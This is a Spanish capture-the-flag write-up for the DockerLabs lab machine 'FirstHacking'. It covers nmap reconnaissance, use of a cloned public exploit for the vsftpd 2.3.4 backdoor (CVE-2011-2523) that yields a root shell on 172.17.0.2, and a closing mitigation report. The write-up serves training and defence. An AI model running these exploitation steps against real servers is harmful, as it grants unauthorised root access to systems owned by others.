# FirstHacking

> Único puerto FTP con vsftpd 2.3.4 vulnerable; su backdoor da shell de root directa mediante un exploit público.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Muy fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 21/tcp (FTP) |
| **Saltos de usuario** | 1 |

**Tags:** `FTP` · `vsftpd 2.3.4` · `Backdoor` · `Exploit` · `RCE`

---

## Reconocimiento

```bash
$ sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
21/tcp open  ftp

$ nmap -p 21 -sC -sV 172.17.0.2 -oN targeted
21/tcp open  ftp     vsftpd 2.3.4
```

Solo el 21 (FTP), con **vsftpd 2.3.4**: una versión con una backdoor conocida (CVE-2011-2523).

## Explotación · backdoor de vsftpd 2.3.4

Esta versión incluye una puerta trasera que da acceso directo como root. Uso un exploit público en un entorno virtual para instalar las dependencias.

```bash
$ python3 -m venv venv && source venv/bin/activate
$ python3 -m pip install pwntools
$ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
$ cd vsftpd_2.3.4_Exploit && chmod +x exploit.py
$ python3 exploit.py 172.17.0.2
[+] Backdoor activado
# whoami
root
```

La propia vulnerabilidad otorga una shell como root, así que no hacen falta pasos de escalada. Máquina FirstHacking completada.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Backdoor en vsftpd 2.3.4 (CVE-2011-2523)

`CWE-506` · A06:2021 – Vulnerable and Outdated Components

**Impacto.** Esta versión de vsftpd contiene una puerta trasera conocida que otorga una shell como root sin autenticación.

**Mitigación.** Actualizar vsftpd a una versión parcheada y verificar la integridad del software instalado desde fuentes de confianza.

---

_Writeup de **FirstHacking** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
